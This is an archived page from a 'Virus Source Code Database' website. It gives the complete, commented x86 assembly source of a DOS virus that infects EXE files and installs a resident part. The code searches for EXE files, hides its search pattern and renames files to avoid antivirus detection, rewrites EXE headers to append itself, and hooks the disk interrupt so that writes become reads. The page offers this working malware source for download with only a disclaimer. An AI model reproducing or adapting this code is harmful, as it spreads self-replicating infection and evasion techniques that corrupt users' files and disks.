<a href="vw13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13_507_asm.php">vw13_507_asm</a><br>
<a href="vw13534a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534a_asm.php">vw13534a_asm</a><br>
<a href="vw13534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534_asm.php">vw13534_asm</a><br>
<a href="vw13534b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534b_asm.php">vw13534b_asm</a><br>
<a href="vx_163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx_163_asm.php">vx_163_asm</a><br>
<a href="vx-163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx-163_asm.php">vx-163_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;--------------------------------------------------------------------;
;                                                                    ;
;                  EXE virus, with resident part                     ;
;                                                                    ;
;                   ---- infecting program ----                      ;
;                                                                    ;
;--------------------------------------------------------------------;
  
;--------------------------------------------------------------------;
;                                                                    ;
;    WARNING : it's definitely NOT safe to assemble and execute      ;
;    this code. If anybody has to, I highly reccomend using          ;
;    a diskette and debugger.                                        ;
;                                                                    ;
;--------------------------------------------------------------------;
  
;*********************************************************************
  
;--------------------------------------------------------------------;
;                                                                    ;
; The EXE virus concept is as follows:                               ;
;                                                                    ;
; First, original Disk Transfer Address is preserved to avoid        ;
; changing command-line text. Also initial values of CS, IP, SS, SP  ;
; DS and ES are saved (to be restored on exit from virus code).      ;
;   Virus is to be appended to original code and, of course, has     ;
; to be relocated before it's executed. Thus, first we look for      ;
; an EXE file. Then we have to know if this is in fact an EXE        ;
; (checking for magic 'MZ' signature) and if there is any free space ;
; in relocation table. This is checked by substracting relocation    ;
; table end (i.e. sum of table start and number of relocation items, ;
; multiplied by table entry size) from EXE header size.              ;
;   Smart virus shouldn't infect a file that's already infected.     ;
; So first 4 bytes of code to be executed is compared against        ;
; virus code. If they match one another, no infection takes place.   ;
;   Having found suitable file, we compute its code end and append   ;
; virus at the end of code, writing alignment to last 512-bytes page ;
; boundary if necessary. Original start address is preserved inside  ;
; virus, and CS:IP value in EXE header gets changed, so that virus   ;
; code would be executed first. Number of pages gets changed,        ;
; together with Last Page Size and Number Of Relocation Items.       ;
;   New relocation item address is appended to relocation table,     ;
; pointing to the segment of the far jump in virus (this is the jump ;
; virus uses to return to original code).                            ;
;   Upon returning from virus, all saved registers and DTA are       ;
; restored to reestablish environment state as if no virus existed.  ;
;                                                                    ;
;   Virus also installs resident part, if it is not already present. ;
; This part's job is to replace all disk 'writes' with corresponding ;
; 'reads'. It's rather unharmful, but can easily be replaced with    ;
; more dangerous one (if somebody is really keen to be called ...).  ;
; Instalation can be removed with equal ease, as well.               ;
;                                                                    ;
;   The real trouble with EXEs is that DOS pays a little (if any)    ;
; attention to Last Page Size. Therefore EXE files ofen have this    ;
; zeroed, even if they have some code on the last page. Writing to   ;
; last page can cause system crash while infected file is being      ;
; executed. To solve the problem, one should first test if EXE file  ;
; really ends as the header contents say and move to last page end   ;
; instead of appending any bytes, if possible.                       ;
;                                                                    ;
;   Another problem is infecting EXEs containg debug info.           ;
; It comes in various formats, and often contains vital informations ;
; placed behind code. This info gets destroyed when file becomes     ;
; infected. I see no solution to this problem, so far.               ;
;                                                                    ;
;--------------------------------------------------------------------;
  
;********************************************************************;
  
;--------------------------------------------------------------------;
;                                                                    ;
;                        SEGMENT dummy                               ;
;                                                                    ;
;   Raison d'etre of this segment is to force assembling of          ;
;   the JMP FAR after the execution of virus code.                   ;
;                                                                    ;
;   This segment serves also to make it possible for the infecting   ;
;   program to return to DOS.                                        ;
;                                                                    ;
;--------------------------------------------------------------------;
  
  
    dummy    segment  'dummy'
  
             assume cs: dummy
  
    d_end    label far          ; this is the point virus jumps to
                                ; after executing itself
             mov  ah, 4Ch
             int  21h           ; DOS EXIT function
  
    dummy    ends
  
;--------------------------------------------------------------------;
;                                                                    ;
;                        SEGMENT code                                ;
;                                                                    ;
;   Code for virus (including its resident part).                    ;
;                                                                    ;
;   Executed from label start:. Exits via dummy:d_end.               ;
;                                                                    ;
;--------------------------------------------------------------------;
  
    code     segment  'code'
  
             public   start, jump, old_IP, old_CS, old_DTA,
             public   next, ok, exit, header, DTA, file_name, old_SS, old_SP, aux
             public   last_page, page_count, item_count, header_size, table_start
             public   header_IP, header_CS, header_SS, header_SP, aux_CS, aux_IP
             public   not_ok, time, date, attributes, new_name, found_name
             public   restore_and_close, dot, seek_dot, next_letter, install_flag
             public   next_lttr, EXE_sign, int_CS, int_IP, virus_length, set_ES
             public   resident, resident_size, l1, call_int, install, set_DS
  
             assume   cs : code, ds : code
  
;--------------------------------------------------------------------;
;                                                                    ;
;          Here are symbolic names for memory locations              ;
;                                                                    ;
;--------------------------------------------------------------------;
  
;  First go names for EXE header contents
  
    EXE_sign     equ  word ptr [header]
    last_page    equ  word ptr [header + 2]
    page_count   equ  word ptr [header + 4]
    item_count   equ  word ptr [header + 6]
    header_size  equ  word ptr [header + 8]
    header_SS    equ  word ptr [header + 0Eh]
    header_SP    equ  word ptr [header + 10h]
    header_IP    equ  word ptr [header + 14h]
    header_CS    equ  word ptr [header + 16h]
    table_start  equ  word ptr [header + 18h]
  
;  Now names for address of mother program
  
    old_IP       equ  word ptr [jump + 1]
    old_CS       equ  word ptr [jump + 3]
  
;  Segment to put resident part in, for instance end of 2nd Hercules page
  
   resident_CS   equ  0BFFEh
  
;  And label for the name of the file found by  Find_First and Find_Next
  
    found_name   equ  DTA + 1Eh
  
;  Last is virus length
  
    virus_length equ  offset header
  
;------------ Now starts virus code --------------------------------;

;  First original values of SS, SP, ES, DS are preserved,
;  and new values for this registers are set
  
    start:   mov  cx, ss            ; temporarily save SS in CX
             mov  dx, sp            ; and SP in DX
  
             mov  ax, cs            ; now AX = CODE
             cli                    ; disable hard ints while changing stack
             mov  ss, ax            ; now SS = CODE
             mov  sp, 0FFFFh        ; and SS points to segment end
             sti                    ; hardware interrupts are OK now
  
             push ds                ; preserve DS on stack
             push es                ; same with ES
  
             push cs
             pop  ds                ; set DS to CODE
  
             mov  [old_SS], cx      ; now as DS is CODE, we can store
             mov  [old_SP], dx      ; original SS and SP in memory
  
;  Original DTA is preserved now
  
             mov  ah, 2Fh
             int  21h
             mov  word ptr [old_DTA], bx      ; now ES:BX points to DTA
             mov  word ptr [old_DTA + 2], es  ; save its address in memory
  
;  Call to Get_DTA would have destroyed ES. Now set it
  
             push ds              ; set  ES to CODE
             pop  es
  
;  And now new DTA is established for virus disk actions
  
             mov  dx, offset DTA  ; DS:DX point to new DTA
             mov  ah, 1Ah
             int  21h
  
;  Store original INT_13 vector for use in resident part
  
             mov  ax, 3513h
             int  21h            ; DOS Get_Interrupt_Vector function

             mov  [int_IP], bx   ; now ES:BX holds INT_13 vector
             mov  [int_CS], es   ; store it inside resident part
  
;  Check if resident part already present
  
             mov  ax, es           ; compare can work with AX
  
             cmp  ax, resident_CS  ; check if this is resident_CS
             jnz  install          ; no, so install
  
             cmp  bx, 0            ; is offset 0 ?
             jnz  install          ; no, so install
  
;  Resident part found, do not install
  
             mov  [install_flag], 0 ; signal 'no installing'
  
             jmp  short  set_ES     ; and omit copying code
  
;  Now resident part is moved to its place in memory
  
install:     mov  ax, resident_CS
             mov  es, ax              ; ES = segment for resident part
             xor  di, di              ; DI = 0, resident starts from offset 0
             mov  si, offset resident ; SI = offset in DS for resident part
             mov  cx, resident_size   ; CX = size of resident part
  
             cld                      ; set auto increment
             rep  movsb               ; copy resident part from DS:SI to ES:DI
  
             mov  [install_flag], 1   ; signal 'instal vector'
  
;  Reestablish destroyed ES to CODE
  
  set_ES:    push ds
             pop  es
  
;  Now decode "*.EXE" name pattern. It's coded to disable 'eye-shot' discovery
  
             mov  si, offset file_name   ; name pattern starts there
             mov  cx, 5                  ; and is 5 bytes long
  
next_letter: inc  byte ptr [si]          ; decode by incrementing by one
             inc  si
             loop next_letter            ; decode all 5 bytes
  
;  Find an EXE file
  
             mov  dx, offset file_name   ; DS:DX points to '*.EXE'
             mov  cx, 20h                ; search for read-only files too
  
             mov  ah, 4Eh                ; DOS Find_First function
             int  21h                    ; now DTA gets filled with info
  
             jnc  check                  ; no carry means file found
                                         ; jump to check if to infect file
  
             jmp  exit                   ; no EXE file - nothing to do
  
;  Find next EXE file, if necessary
  
    next:    mov  ah, 4Fh                ;DOS Find_Next function
             int  21h
  
             jnc  check                  ; see jumps after Find_First
             jmp  exit                   ; for explanation
  
;  Check if file should and can be infected
  
;  First of all, get file attributes
  
    check:   mov  dx, offset found_name   ; DS:DX points to found file name
  
             mov  ax, 4300h               ; DOS Get_File_Attributes function
             int  21h                     ; attributes returned in CX
  
             mov  [attributes], cx        ; preserve them in memory
  
;  Then change file attributes to 'neutral'
  
             mov  dx, offset found_name   ; DS:DX points to found file name
             xor  cx, cx                  ; CX = 0 - means no attributes set
  
             mov  ax, 4301h               ; DOS Set_File_Attributes function
             int  21h                     ; attributes to be set in CX
  
;  To avoid being spotted by VIRBLK, rename ????????.EXE to ???????.
  
             mov  si, offset found_name   ; DS:DX points to found file name
             mov  di, offset new_name     ; ES:DI points to new name
  
             cld                          ; set auto increment
  
;  Copy old name to new name until dot found
  
  seek_dot:  lodsb                        ; get character at DS:SI
             cmp  al, '.'                 ; check if it is a dot
             stosb                        ; copy it anyway to ES:DI
  
             jz   dot                     ; dot found, end of copying
  
             loop seek_dot                ; if no dot, copy next character
  
;  DOS requires ASCIIZ strings, so append a byte of 0 to new name
  
       dot:  xor  al, al                  ; AL = 0
             stosb                        ; store 0 to byte at ES:DI
  
;  Now rename can be performed
  
             mov  dx, offset found_name   ; DS:DX points to old name
             mov  di, offset new_name     ; ES:DI points to new name
  
             mov  ah, 56h                 ; DOS Rename_File function
             int  21h
  
;  It is safe to open file now
  
             mov  dx, offset new_name     ; DS:DX points to file name
  
             mov  ax, 3D02h               ; DOS Open_File_Handle fuction
             int  21h                     ; open file for reading and writing
  
             jc   next                    ; carry set means for some reason
                                          ; operation failed
                                          ; try to find next file
  
;  Preserve handle for just open file in BX register
  
             mov  bx, ax                  ; all DOS calls require handle in BX
  
;  Now store original file time and date, to be restored on closing the file
  
             mov  ax, 5700h               ; DOS Get_File_Time_Date function
             int  21h                     ; time returned in CX, date in DX
  
             mov  [time], cx              ; store time in memory
             mov  [date], dx              ; same with date
  
;  Read EXE header to memory
  
             mov  dx, offset header       ; DS:DX = place to read header to
             mov  cx, 1Ah                 ; header is 1Ah bytes long
  
             mov  ah, 3Fh                 ; DOS Read_Handle function
             int  21h
  
;  Check if it is a real EXE, not just EXE-named file
  
 check_EXE:  cmp  EXE_sign, 5A4Dh         ; first two bytes of header should
                                          ; contain 'MZ' characters
  
             jne  not_ok                  ; if not, don't proceed with file
  
;  It is EXE, check if it is already infected
;  by comparing code start with itself
  
;  Compute where code in file starts
  
             mov  ax, [header_CS]         ; get start CS for file
             add  ax, [header_size]       ; add header size
  
             mov  cx, 16                  ; above were in 16 bytes units
             mul  cx                      ; so multiply by 16
                                          ; DX|AX holds result
  
             add  ax, [header_IP]         ; add for IP
             adc  dx, 0                   ; propagate carry if necessasry
  
;  Now DX|AX holds file offset for code start, move there
  
             mov  cx, dx                  ; set registers for DOS call
             mov  dx, ax
  
             mov  ax, 4200h               ; DOS Move_File_Ptr function
             int  21h                     ; move relatively to start
  
;  Read first four bytes of code
  
             mov  dx, offset aux          ; DS:DX = place to read code into
             mov  cx, 4                   ; CX = number of bytes to read
  
             mov  ah, 3Fh                 ; DOS Read_Handle function
             int  21h
  
;  Compare them with itself
  
             mov  di, offset aux          ; ES:DI points to code from file
             mov  si, offset start        ; DS:SI points to itself start
             mov  cx, 2                   ; CX = number of words to compare
             cld                          ; set auto increment
  
             repe cmpsw                   ; compare while equal
  
             je   not_ok                  ; equal = infected, don't proceed
  
;  Check if there is space in relocation table to put one more item
  
;  Calculate where Relocation_Table ends
  
             mov  ax, [item_count]        ; get number of Relocation Items
             inc  ax                      ; add for new one
             mov  cx, 4                   ; each one is 4 bytes long
             mul  cx                      ; so multiply by 4
                                          ; DX|AX holds result
  
             add  ax, [table_start]       ; add offset of Relocation_Table
             adc  dx, 0                   ; process carry
  
;  Now DX|AX holds file offset for table end, store it temporarily in DI|SI
  
             mov  di, dx                  ; preserve Relocation_Table offset
             mov  si, ax
  
;  Calculate where code starts (in file)
  
             mov  ax, [header_size]       ; get header size for this EXE
             mov  cx, 10h                 ; as it is in 16 byte units,
             mul  cx                      ; multiply by 16
                                          ; DX|AX holds result
  
;  See if there is free space for relocation item
  
             sub  ax, si                  ; substract Relocation_Table end
             sbb  dx, di
  
             jae  ok                      ; Relocation_Table end not less
                                          ; then code start, so there IS room
  
;  If somehow this file is not to be infected, restore it's original state
  
    not_ok:  call restore_and_close
  
             jmp  next          ; nevertheless, try to find infectable one
  
;  File is to be infected now
  
;  First adjust file offset for new relocation item
  
    ok:      sub  si, 4                   ; new item starts 4 bytes
             sbb  di, 0                   ; before Relocation_Table end
  
;  Then preserve temporarily address of the mother code
  
             mov  ax, [old_CS]           ; preserve jump address via AX
             mov  [aux_CS], ax           ; in memory
             mov  ax, [old_IP]
             mov  [aux_IP], ax
  
;  Form inside itself a jump to new mother start
  
             mov  ax, [header_IP]        ; store new mother CS:IP as jump
             mov  [old_IP], ax           ; do it via AX
             mov  ax, [header_CS]
             mov  [old_CS], ax
  
;  Calculate last page alignment
  
             mov  cx, [last_page]         ; CX = number of bytes in last page
             mov  ax, 200h                ; AX = page size (page is 512 bytes)
  
             sub  ax, cx                  ; CX = alignment to page boundary
  
             mov  bp, ax                  ; preserve alignment in BP
  
; Calculate new CS:IP values to execute virus instead of mother
  
             mov  ax, [page_count]        ; get number of pages in new mother
             mov  cx, 20h                 ; multiply by 32 to convert to
             mul  cx                      ; 16 bytes units
  
             sub  ax, [header_size]       ; decrease by header size
  
;  Modify header as necessary
  
             mov  [header_CS], ax         ; AX holds CS for virus
             xor  ax, ax                  ; now zero AX
             mov  [header_IP], ax         ; as IP for virus is 0
  
             add  [page_count], 2         ; reserve space for virus
  
             inc  [item_count]            ; there'll be one more item
  
             mov  [last_page], offset header   ; last page will be as long
                                               ; as virus itself
             and  [last_page], 1FFh            ; modulo 512, of course
  
;  Move to file start
  
             xor  cx, cx                 ; start means offset 0
             xor  dx, dx
  
             mov  ax, 4200h              ; DOS Move_File_Ptr function
             int  21h                    ; move relatively to start
  
;  Write new header
  
             mov  dx, offset header      ; DS:DX points to new header
             mov  cx, 1Ah                ; which is still 1A bytes long
  
             mov  ah, 40h                ; DOS Write_Handle function
             int  21h
  
;  Move to new Relocation Item position
  
             mov  cx, di                 ; get stored position from DI|SI
             mov  dx, si
  
             mov  ax, 4200h              ; DOS Move_File_Ptr function
             int  21h                    ; move relatively to start
  
;  Write new relocation item
  
             mov  [header_IP], offset old_CS ; new Relocation Item offset
                                             ; is jump to new mother code
  
             mov  dx, offset header_IP       ; DS:DX = new relocation item
             mov  cx, 4                      ; exactly 4 bytes long
  
             mov  ah, 40h                 ; DOS Write_Handle function
             int  21h
  
;  Calculate file offset for new mother code end
  
             mov  ax, [header_CS]      ; get mother code lenght
             add  ax, [header_size]    ; add header size
             mov  cx, 10h              ; it's in 16 bytes units
             mul  cx                   ; so multiply by 16
  
             sub  ax, bp               ; last page is not full
             sbb  dx, 0                ; so move back appropirately
  
;  Move file ptr to mother code end
  
             mov  cx, dx               ; DX|AX = file offset to code end
             mov  dx, ax               ; set CX|DX for DOS call
  
             mov  ax, 4200h            ; DOS Move_File_Ptr function
             int  21h                  ; move relatively to start
  
;  Write alignement (no matter what, only number is important)
  
             mov  cx, bp               ; get alignement amount
  
             mov  ah, 40h              ; DOS Write_Handle function
             int  21h                  ; write CX bytes
  
;  Now prepare to append itself to EXE file
  
;  First encode EXE name patter anew
  
             mov  si, offset file_name   ; DS:SI points to name pattern
             mov  cx, 5                  ; it is 5 characters long
  
next_lttr:   dec  byte ptr [si]          ; encode by decrement
             inc  si
             loop next_lttr              ; encode all 5 characters
  
;  All ready, append itself now
  
             xor  dx, dx                 ; DX = 0, start offset for virus code
             mov  cx, virus_length       ; CX = number of bytes to write
  
             mov  ah, 40h                ; DOS Write_Handle function
             int  21h
  
;  No further action involving file will be taken, so restore it's state
  
             call restore_and_close      ; restore date and time, close file
  
;  Restore jump to this mother code
  
             mov  ax, [aux_CS]         ; restore jump addres via AX
             mov  [old_CS], ax
             mov  ax, [aux_IP]
             mov  [old_IP], ax
  
;  All done with infecting, prepare to execute mother
  
;  Restore original DTA
  
             push ds                   ; preserve DS (now DS = CODE)
  
    exit:    lds  dx, old_DTA          ; get original DTA address to DS:DX
  
             mov  ah, 1Ah              ; DOS Set_DTA function
             int  21h
  
;  Check if install new INT_13 vector
  
             cmp  [install_flag], 0    ; 0 means no installing
  
             jz   set_DS               ; omit installing
  
;  Install  resident part
  
             mov  ax, resident_CS      ; load CS for resident to DS (via AX)
             mov  ds, ax
             xor  dx, dx               ; DS:DX = address of resident part
  
             mov  ax, 2513h            ; DOS Set_Interrupt_Vector function
             int  21h                  ; set vector for INT_13
  
set_DS:      pop  ds                   ; restore DS to CODE
  
             mov  bx, [old_SS]         ; BX = original SS
             mov  cx, [old_SP]         ; CX = original SP
  
             pop  es                   ; restore original DS and ES
             pop  ds
  
             cli                       ; disable hardware interrupts
             mov  sp, cx               ; while restoring original SS:SP
             mov  ss, bx
             sti                       ; enable hardware interrupts
  
;  Virus has done all its job, now let mother do its own
  
    jump:    jmp  dummy:d_end          ; jump to original code
  
  
;-----------  here is the one and only procedure -------------------;
  
    restore_and_close  proc  near
  
;  Restore original file time and date
  
             mov  cx, [time]           ; get saved time
             mov  dx, [date]           ; get saved date
  
             mov  ax, 5701h               ; DOS Set_File_Time_Date function
             int  21h                     ; time set as CX, date as DX
  
;  Close file
  
             mov  ah, 3Eh              ; DOS Close_File function
             int  21h
  
;  Restore original name
  
             mov  dx, offset new_name    ; DS:DX points to new name
             mov  di, offset found_name  ; ES:DI points to original name
  
             mov  ah, 56h                 ; DOS Rename_File function
             int  21h
  
; Restore original file attributes
  
             mov  dx, offset found_name   ; restore attributes
             mov  cx, [attributes]
  
             mov  ax, 4301h               ; DOS Set_File_Attributes function
             int  21h                     ; attributes set as CX
  
             ret
  
    restore_and_close  endp
  
  
;------------ and here go the resident part of the virus -------------;
  
resident:    pushf                   ; save flags
  
             cmp  ah, 3              ; is it Disk_Write_1 ?
             jnz l1                  ; no, check Disk_Write_2
  
             mov  ah, 2              ; yes, convert to Disk_Read_1
             jmp  short  call_int    ; and exit resident
  
      l1:    cmp  ah, 0Bh            ; is it Disk_Write_2 ?
             jnz  call_int           ; no, exit resident
  
             mov  ah, 0Ah            ; yes, convert to Disk_Read_2
  
call_int:    popf                    ; restore flags
  
  
;  Next 5 bytes form long jump to original INT_13 handler
  
             db   0EAh               ; means JMP FAR
  
int_IP       dw   0                  ; and here the address to jump to
int_CS       dw   0
  
resident_size  equ  $ - resident
  
;-------- now data for virus, just encoded file name pattern -------;
  
    file_name  db  ')-DWD', 0
  
;-------------------------------------------------------------------;
;                                                                   ;
;         Here VIRUS ends. The rest are purely placeholders         ;
;                                                                   ;
;-------------------------------------------------------------------;
  
;*******************************************************************;

    header   dw   13 dup (0)

    old_SS   dw   0
    old_SP   dw   0

    aux_CS   dw   0
    aux_IP   dw   0

    old_DTA  dd   0

    time     dw   0
    date     dw   0

    attributes  dw  0

    install_flag db 0

    new_name    db  9 dup (0)

    DTA      dw   2Ch dup (0)

    aux      dw   2 dup (0)

    code     ends

             end  start



</textarea></td></tr></table></body></html>
